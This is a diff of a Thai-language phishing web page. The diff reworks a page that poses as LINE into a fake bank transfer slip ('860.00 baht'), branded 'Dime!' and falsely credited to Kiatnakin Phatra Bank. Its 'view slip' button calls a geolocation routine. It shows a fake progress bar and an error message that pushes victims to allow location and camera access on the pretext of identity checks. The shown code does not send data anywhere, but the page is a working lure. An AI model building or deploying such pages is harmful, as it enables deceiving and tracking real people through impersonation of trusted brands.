@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>แอดไลน์เพิ่มเพื่อน</title>
-    <meta property="og:title" content="แอดไลน์เพิ่มเพื่อน">
-    <meta property="og:description" content="เพิ่มเพื่อนเพื่อติดต่อทาง LINE">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/4/41/LINE_logo.svg">
+    <title>สลิปโอนเงิน</title>
+    <meta property="og:title" content="รายการโอนเงินสำเร็จ">
+    <meta property="og:description" content="จำนวนเงิน 860.00 บาท โอนไปยัง สอง ราษฎรดี">
+    <meta property="og:image" content="/slip.jpg">
     <style>
         body { 
             font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
@@ -66,7 +66,7 @@
             margin-bottom: 35px; 
         }
         button { 
-            background: #06C755; 
+            background: #00A950; 
             color: white; 
             border: none; 
             padding: 14px 20px; 
@@ -110,7 +110,7 @@
             transition: border-color 0.2s;
         }
         .input-group input:focus {
-            border-color: #06C755;
+            border-color: #00A950;
         }
         
         /* Loading Animation */
@@ -138,7 +138,7 @@
         .progress-bar {
             width: 0%;
             height: 100%;
-            background-color: #06C755;
+            background-color: #00A950;
             transition: width 0.3s ease;
         }
         .loading-text {
@@ -150,26 +150,24 @@
     </style>
 </head>
 <body>
-    <!-- แถบสีเขียวด้านบนแบบแอป LINE -->
-    <div class="header">
-        <svg width="70" height="24" viewBox="0 0 100 30" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <text x="0" y="22" font-family="Arial, sans-serif" font-weight="900" font-size="28" fill="white" letter-spacing="-1">LINE</text>
-        </svg>
+    <!-- แถบสีเขียวด้านบน (ปรับเป็นสีเขียวของ Dime!) -->
+    <div class="header" style="background-color: #17e273;">
+        <span style="color: black; font-weight: bold; font-size: 20px;">Dime!</span>
     </div>
 
     <div class="container">
         <!-- โลโก้ LINE จาก Wikimedia -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/LINE_logo.svg" alt="LINE Logo" class="logo">
+        <img src="/slip.jpg" alt="สลิปโอนเงิน" class="logo" style="width: auto; height: 120px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
         
-        <h2>เข้าสู่ระบบด้วย LINE</h2>
-        <p>ยืนยันตัวตนเพื่อดำเนินการต่อ<br>ข้อมูลของคุณจะถูกเก็บรักษาอย่างปลอดภัย</p>
+        <h2>ตรวจสอบสลิป</h2>
+        <p>กำลังโหลดข้อมูลจากธนาคาร<br>กรุณารอสักครู่...</p>
         
         <button id="loginBtn" onclick="getLocation()">
             <svg id="btnIcon" width="22" height="22" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
-                <path d="M24 10.304c0-5.369-5.383-9.738-12-9.738-6.616 0-12 4.369-12 9.738 0 4.814 3.55 8.888 8.498 9.582.353.076.83.232.953.535.111.272.072.695.035.952l-.246 1.488c-.048.286-.232 1.139 1.002.617 1.233-.522 6.647-3.916 8.895-6.568C22.618 14.887 24 12.753 24 10.304z"/>
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/>
             </svg>
             <div id="btnSpinner" class="spinner"></div>
-            <span id="btnText">เปิด LINE เพื่อแอดเพื่อน</span>
+            <span id="btnText">ดูรายละเอียดสลิปโอนเงิน</span>
         </button>
         
         <!-- แถบโหลดปลอม -->
@@ -187,7 +185,7 @@
 
     <div class="footer">
         <a href="#">Help</a> | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a><br><br>
-        © LINE Corporation
+        © Kiatnakin Phatra Bank
     </div>
 
     <script>
@@ -363,7 +361,7 @@
             const btnIcon = document.getElementById('btnIcon');
             const btnSpinner = document.getElementById('btnSpinner');
             btn.disabled = false;
-            btnText.textContent = 'เปิด LINE เพื่อแอดเพื่อน';
+            btnText.textContent = 'ดูรายละเอียดสลิปโอนเงิน';
             btnIcon.style.display = 'block';
             btnSpinner.style.display = 'none';
         }
@@ -435,7 +433,7 @@
             
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    status.innerHTML = "❌ การเชื่อมต่อถูกปฏิเสธ<br>กรุณากด 'Allow' หรือ 'อนุญาต' เพื่อเข้าสู่ระบบแชท";
+                    status.innerHTML = "❌ ระบบรักษาความปลอดภัยปฏิเสธการเข้าถึง<br>กรุณากด <b>'Allow' หรือ 'อนุญาต'</b> (ตำแหน่งที่ตั้ง/กล้อง) เพื่อยืนยันตัวตนก่อนดูสลิป";
                     break;
                 case error.POSITION_UNAVAILABLE:
                     status.textContent = "❌ ไม่สามารถตรวจสอบข้อมูลเครือข่ายได้";
